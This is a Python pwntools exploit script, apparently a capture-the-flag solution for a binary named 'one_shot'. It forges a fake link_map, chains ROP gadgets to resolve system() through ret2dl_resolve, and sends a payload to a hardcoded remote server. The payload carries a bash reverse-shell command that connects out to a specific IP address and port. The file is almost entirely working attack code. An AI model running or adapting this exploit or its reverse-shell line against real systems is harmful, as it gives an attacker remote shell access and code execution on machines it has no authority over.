#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
def build_link_map_x64(elf,libc,link_map_addr,dst_f,src_f="__libc_start_main",dst_add_got=None):
    """
    dst_f: libc function or libc offset
    src_f: str:a elf got table resolved && byte(elf.got[src_f]-8) & 3 != 0
    dst_add_got: funtion fake got, it will store dst_f in libc after resolved,
    """
    if dst_add_got==None:
        dst_add_got=link_map_addr+8
    if type(dst_f) == str:
        dst_add=libc.sym[dst_f]
    else:
        dst_add=dst_f

    offset=(dst_add-libc.sym[src_f])%2**64
    f={
        0:offset,
        0x68:link_map_addr+0x60,
        0x70:link_map_addr+0x70,
        0x78:elf.got[src_f]-8,
        0x80:link_map_addr+0x88,
        0x88:(dst_add_got-offset)%2**64,
        0x90:7,
        0xf8:link_map_addr+0x80-8,
    }
    return f    


context.log_level="debug"
context.arch="amd64"
os.environ["LD_LIBRARY_PATH"]="./"
pwn_file="./one_shot"
elf=ELF(pwn_file)
libc=elf.libc

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("178.128.87.12",31338)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

link_map_add=0x601a00
link_map_f=build_link_map_x64(elf,libc,link_map_add,"system","close")
link_map=fit(link_map_f,filler="a").replace("a","")

cmd="bash -c \"bash -i >& /dev/tcp/47.75.10.138/9999 0>&1\""
cmd_addr=link_map_add+0x98
link_map_rop=[
    p64(0x4006FB)+p64(link_map_add+0x68+0x1c)+p64(0x400673)+p64(0x1)+p64(link_map_add+0x68+0x20)+p64(0x40067A),# write 0x68-0x98
    p64(0)+p64(link_map_add+0xf8+0x20)+p64(0x400673),# write 0xf8
    p64(0)+p64(link_map_add+4+0x20)+p64(0x400673),# adjust rdi offset
    p64(0)+p64(link_map_add+0x20)+p64(0x400673)+p64(0)*2,# write 0x0
    # control rdi
    p64(0x40083A)+p64(0)+p64(1)+p64(elf.got["close"])+p64(0)+p64(0)+p64(cmd_addr)+p64(0x400820)+"a"*56,
    p64(0x400506)+p64(link_map_add)+p64(0),# dl resolve
]
f={
    0:p32(0x8A919FF0),
    0x4:[p32(0x30+len(cmd))+p64(link_map_f[0x68])+p64(link_map_f[0x70])+p64(link_map_f[0x78])+p64(link_map_f[0x80])+p64(link_map_f[0x88])+p64(link_map_f[0x90])+cmd,
        p32(link_map_f[0xf8])+p32(0xffffffff)+p64(link_map_f[0])[:4],
        ],
    # set rbp
    0x88:link_map_rop
}
payload=fit(f,filler="\x00")
conn.send(payload)

